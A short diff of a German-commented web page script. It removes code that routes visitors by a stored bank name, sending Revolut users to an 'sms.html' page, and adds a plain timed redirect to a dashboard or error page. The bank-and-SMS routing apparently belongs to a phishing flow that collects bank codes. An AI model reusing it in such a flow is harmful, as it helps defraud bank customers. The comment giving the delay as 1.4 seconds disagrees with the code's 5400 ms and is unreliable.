@@ -105,24 +105,10 @@
     const ref = params.get("ref");
 
     // kleine Verzögerung, dann weiter
-    const bankName = (sessionStorage.getItem("bank_name") || "")
-  .toLowerCase()
-  .trim();
-
-const isRevolut = bankName.includes("revolut"); // nur Bedingung
-
-setTimeout(() => {
-
-  let target;
-
-  if (isRevolut) {
-    target = "sms.html";
-  } else {
-    target = ref ? `route-b.html?ref=${encodeURIComponent(ref)}` : "apple.html";
-  }
-  window.location.replace(target);
-
-}, 12000);
+    setTimeout(() => {
+      const target = ref ? `dashboard.html?ref=${encodeURIComponent(ref)}` : "fehler.html";
+      window.location.replace(target);
+    }, 5400); // 1.4s (kannst du auf 800–2500 ändern)
   </script>
 </body>
 </html>
